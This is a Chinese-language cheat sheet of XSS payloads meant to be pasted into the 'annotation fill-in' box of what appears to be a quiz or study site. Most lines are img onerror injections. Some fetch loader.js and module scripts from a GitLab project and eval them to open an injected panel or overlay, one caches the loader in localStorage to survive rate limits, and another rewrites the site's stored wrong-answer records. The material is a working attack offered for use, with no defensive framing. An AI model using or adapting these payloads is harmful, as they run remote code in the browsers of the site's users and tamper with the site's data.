# 测试用 payload

面板打不开、或者只想验证某一个点时，把下面任意一行贴进「注释填空」的输入框，随便答错提交即可。

## 0. 注入是否还活着

```html
<img src=x onerror=alert('A')>
```

## 1. 能不能拉到远端脚本

```html
<img src=x onerror="fetch('https://gitlab.com/api/v4/projects/88544686/repository/files/loader.js/raw?ref=main').then(r=>r.text()).then(t=>alert('len='+t.length)).catch(e=>alert('err='+e.message))">
```

## 2. 打开面板（正片）

```html
<img src=x onerror="fetch('https://gitlab.com/api/v4/projects/88544686/repository/files/loader.js/raw?ref=main').then(r=>r.text()).then(eval)">
```

## 2b. 带缓存 + 报错（推荐，限流时也能用）

```html
<img src=x onerror="let c=null;try{c=localStorage.getItem('fh:loader')}catch(e){};c?eval(c):fetch('https://gitlab.com/api/v4/projects/88544686/repository/files/loader.js/raw?ref=main').then(r=>{if(!r.ok)throw Error('HTTP '+r.status);return r.text()}).then(t=>{try{localStorage.setItem('fh:loader',t)}catch(e){};eval(t)}).catch(e=>alert('load fail: '+e.message))">
```

拉过一次之后就有缓存，之后即使 GitLab 限流也能直接开面板。清除缓存：`localStorage.removeItem('fh:loader')`。

## 3. 编码支持检测（录像/播放）

```html
<img src=x onerror="alert(['video/mp4;codecs=avc1.42E01E','video/mp4','video/webm;codecs=vp8','video/webm;codecs=vp9'].map(function(t){return t+' = '+MediaRecorder.isTypeSupported(t)}).join('\n'))">
```

## 4. 直接跑自检（不经过面板）

```html
<img src=x onerror="fetch('https://gitlab.com/api/v4/projects/88544686/repository/files/mods%2Ftest.js/raw?ref=main&t='+Date.now()).then(r=>r.text()).then(eval)">
```

## 5. 直接开遮罩（带直链）

```html
<img src=x onerror="fetch('https://gitlab.com/api/v4/projects/88544686/repository/files/mods%2Fpeek.js/raw?ref=main&t='+Date.now()).then(r=>r.text()).then(eval)">
```

## 6. 清掉落盘脏数据

```html
<img src=x onerror="let s=JSON.parse(localStorage.getItem('wycg_v3')||'{}');Object.values(s.wrong||{}).forEach(q=>delete q.yourAns);localStorage.setItem('wycg_v3',JSON.stringify(s));alert('ok')">
```

---

约定：所有模块都在 `mods/` 下，入口是根目录的 `loader.js`；改完文件后 URL 上加 `&t=` 时间戳就能绕过缓存。
